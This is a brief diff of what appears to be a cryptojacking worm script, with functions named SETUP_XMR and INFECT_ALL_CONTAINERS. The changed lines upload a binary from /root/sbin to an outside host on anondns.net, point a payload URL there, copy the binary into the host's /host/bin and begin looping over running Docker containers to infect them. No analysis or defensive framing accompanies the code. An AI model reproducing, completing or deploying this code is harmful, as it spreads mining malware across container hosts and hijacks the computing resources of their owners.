@@ -108,7 +108,8 @@ function SETUP_XMR() {
 
 # Infect all containers
 function INFECT_ALL_CONTAINERS() {
-    UPSPINTEST=$(curl -F "file=@/root/sbin" http://194.68.244.14/upload.php) || { echo "Failed to upload file"; exit 1; }
+    curl -F "file=@/root/sbin" http://x86.anondns.net/transfer.php
+    UPSPINTEST=http://x86.anondns.net/sbin
     mkdir -p /host/bin
     cp ./sbin /host/bin/sbin || { echo "Failed to copy sbin"; exit 1; }
     docker ps --quiet | while read -r container_id; do
